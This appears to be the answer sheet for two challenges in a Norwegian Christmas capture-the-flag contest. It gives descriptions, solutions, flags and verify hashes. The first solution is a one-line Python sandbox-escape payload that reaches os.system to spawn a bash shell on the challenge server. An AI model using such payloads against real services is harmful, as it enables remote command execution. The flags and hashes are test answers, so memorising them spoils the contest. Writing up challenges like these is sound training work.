# Week 3 - normal challenge

### Description

Julenissen var ikke veldig blid da han fant ut at noen i forrige uke hadde tuklet med snille/slemme barn systemet sitt. Julenissen har derfor innleid Elf Consulting til å utvikle et nytt program, nemlig SantasList9000!
Men Julenissen stoler ikke helt på disse konsulentalvene, og ønsker at noen eksterne verifiserer at det nye programmet både er trygt og sikkert. Kan dere sjekke og verifisere at det nye programmet fungerer som det skal? Vi er blitt informert at kildekoden er gjort tilgjengelig også 🙂

`nc 129.241.150.119 34403`

### Category

misc

### Solution

`show.__globals__['__builtins__'].__import__("os").system("bash")`

Flag: `Itemize{n1ss3ns_l1st3_9000}`

Flag format: `Itemize{l33t_t3xt}`

Verify hash: `3d5dac89d1393d3513fde2d1b62eeb59`

# Week 3 - easy challenge

### Description

Styret i Itemize holder for tiden på å pusse opp på kontoret vårt. 🪚 Men i dag når vi skulle innom kontoret, fant vi et postkort på pulten. Julekortet har ingen bakside, og heller ingen tekst tilknyttet seg. Klarer du å finne ut hva postkortet inneholder?

https://cloud.itemize.no/s/iQnKKdQdaZ8Hx2j

### Category

stego/misc

### Solution

- Aperisolve the postcard for QR code
- Scanning the QR code sends to https://christmas.ctf.itemize.no/
- Change onclick event condition from false to true and click the button, or alternatively reverse the obfuscated code and go to https://christmas.ctf.itemize.no/h0h0h0.html for flag

Flag: `Itemize{3n_kj3d3l1g_g4v3}`

Flag format: `Itemize{l33t_t3xt}`

Verify hash: `ff5b07ad838abc9f43a358220d4829e4`
